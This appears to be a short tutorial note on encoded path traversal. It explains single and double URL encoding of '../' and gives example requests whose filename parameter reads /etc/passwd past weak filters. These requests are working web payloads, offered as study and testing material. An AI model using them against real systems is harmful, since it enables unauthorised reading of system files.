# Encoded Path Traversal

## Overview

Encoded Path Traversal is a technique used when an application or security filter blocks normal traversal sequences such as `../`.

The traversal characters can be URL-encoded so that the application may decode them later and interpret them as path traversal.

## Example

Normal traversal:

GET /image?filename=../../../etc/passwd

URL-encoded traversal:

GET /image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

Here:

%2e = .
%2f = /

So:

%2e%2e%2f

is equivalent to:

../

## Double URL Encoding

If the application or filter decodes the input more than once, double encoding can also be tested.

Example:

%252e%252e%252f

After decoding once:

%2e%2e%2f

After decoding again:

../

Example request:

GET /image?filename=%252e%252e%252f%252e%252e%252fetc/passwd

## Practical Testing

If normal traversal is blocked:

../../../etc/passwd

try URL encoding:

%2e%2e%2f%2e%2e%2fetc/passwd

If the application appears to decode the input multiple times, test double encoding:

%252e%252e%252f%252e%252e%252fetc/passwd

## Key Takeaway

Encoding can sometimes bypass weak filters that look only for literal `../` sequences.

The important part is understanding when and how the application decodes the supplied input before using it as a filesystem path.